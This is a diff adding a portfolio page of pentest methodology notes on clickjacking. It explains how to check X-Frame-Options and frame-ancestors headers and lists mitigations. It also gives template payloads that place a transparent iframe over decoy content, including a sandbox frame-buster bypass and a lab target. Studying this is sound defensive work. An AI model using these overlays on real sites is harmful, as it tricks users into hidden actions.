@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="223c4ad3-92fc-4bd9-9fb2-8e1fa2d70730" class="page sans"><header><h1 class="page-title">ClickJacking</h1><p class="page-description"></p></header><div class="page-body"><ul id="007f3d01-e134-44e2-ad33-d9759d6fe96a" class="bulleted-list"><li style="list-style-type:disc">ClickJacking is where a user can be tricked into performing an action on a website that’s hidden within the content of a decoy website.</li></ul><ul id="4f540dee-5e7d-424c-8314-fcfeeca1d9d4" class="bulleted-list"><li style="list-style-type:disc">Burp Suite’s ClickBandit is a good tool for generating payloads</li></ul><p id="b7a27a9f-79a8-4af5-9566-b195d401ff76" class="">
+</p><p id="366b6497-5fe0-4eac-8d42-e8111632b27a" class="">If X-Frame-Options is set to ‘deny’ or ‘sameorigin’ application is not likely vulnerable to clickjacking</p><p id="62415918-71db-40bd-af57-a7e17c3a2e41" class="">
+</p><p id="762fdc15-507b-4452-9440-f0720595f96a" class="">Same for Frame-Ancestors CSP directive when set to ‘none’ or ‘self’. if it contains domains, check wildcard configuration</p><p id="5e78e9c1-90a5-40da-af10-f852131e6642" class="">
+</p><p id="c67c6de3-4e87-4e65-a53c-b22ef741d035" class="">Payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cea5110f-2c21-4fe2-85a2-0ff31b75d02e" class="code"><code class="language-XML">&lt;style&gt;
+    iframe {
+        position:relative;
+        width:$width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 1;
+    }
+&lt;/style&gt;
+&lt;div&gt;Test me&lt;/div&gt;
+&lt;iframe src=&quot;website.com&quot;&gt;&lt;/iframe&gt;</code></pre><p id="fe4485cf-364b-4b0c-bf33-afd41a84dc2f" class="">
+</p><ul id="e131a0b5-36aa-4d0a-8498-91693f252bb0" class="bulleted-list"><li style="list-style-type:disc">We can try prefilling user input data through URL parameters!</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1fe1fb8b-37f0-4d60-a931-2072deddc862" class="code"><code class="language-XML">website.com/login?username=test&amp;password=moo</code></pre><p id="3b5fca0f-5231-492f-80d4-afbc6a9b5400" class="">
+</p><p id="f749d4e2-d120-4e29-9df3-afdf65d6ee5f" class="">Frame Buster bypass (sandbox allow-forms):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18dc62c0-39c4-4ffe-b52e-55b4e727aa36" class="code"><code class="language-XML">&lt;style&gt;
+    iframe {
+        position:relative;
+        width:$width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 1;
+    }
+&lt;/style&gt;
+&lt;div&gt;Test me&lt;/div&gt;
+&lt;iframe sandbox=&quot;allow-forms&quot;
+src=&quot;website.com&quot;&gt;&lt;/iframe&gt;</code></pre><p id="85e39034-ba72-4bcd-8f23-f969e70e3196" class="">
+</p><p id="eadc8cda-f07a-4e21-92a9-20adb9b801d4" class=""><strong>Mitigations:</strong></p><p id="1a208aed-d797-458f-9f0f-74d0de0bbc87" class="">Set X-Frame-Options is set to ‘deny’ or ‘sameorigin’.</p><p id="a2431c02-460a-4caa-88ef-778cbbe1674a" class="">
+</p><p id="d4059b41-2c54-400b-8ffb-1fba1a40accd" class="">Set Frame-Ancestors CSP directive when set to ‘none’ or ‘self’. if it must contain domains, check wildcard configuration.</p><p id="5fe5da0b-5d0d-4513-8bc7-2d5441f676fc" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d6eebee3-6330-4a60-bf45-7e5ac09ffc42" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;style&gt;
+    iframe {
+        position:relative;
+        width:$width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 1;
+    }
+&lt;/style&gt;
+&lt;div&gt;Test me&lt;/div&gt;
+&lt;iframe src=&quot;YOUR-LAB-ID.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;</code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
